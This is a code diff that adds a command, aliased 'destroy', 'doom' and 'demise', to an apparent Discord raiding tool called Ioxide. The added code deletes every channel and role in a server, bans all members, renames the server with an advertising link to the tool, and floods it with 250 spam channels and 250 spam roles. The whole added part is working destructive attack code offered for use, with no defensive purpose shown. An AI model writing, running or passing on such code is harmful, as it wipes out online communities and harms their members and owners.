@@ -336,3 +336,35 @@ async def afkcheck(ctx):
 if __name__ == '__main__':
     Init()
 
+@Ioxide.command(aliases=['destroy','doom','demise'])
+async def Wizz(ctx):
+    await ctx.message.delete()
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()    
+        except:
+            pass
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass    
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name=RandString(),
+            description="https://Ioxide.wtf",
+            reason="https://github.com/klioxide-lol/ioxideTool",
+            icon=None,
+            banner=None
+        )  
+    except:
+        pass        
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name=RandString())
+    for _i in range(250):
+        await ctx.guild.create_role(name=RandString(), color=RandomColor())
